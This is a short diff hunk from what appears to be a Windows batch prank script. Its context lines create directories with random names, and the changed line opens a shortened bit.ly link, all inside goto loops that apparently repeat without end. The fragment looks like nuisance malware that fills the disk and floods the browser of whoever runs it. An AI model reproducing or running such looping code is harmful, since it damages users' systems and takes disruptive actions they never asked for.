@@ -86,5 +86,5 @@ md %random%
 goto y
 
 :y
-start explorer "https://bit.ly/1mgYHpR"
+start "https://bit.ly/1mgYHpR"
 goto x
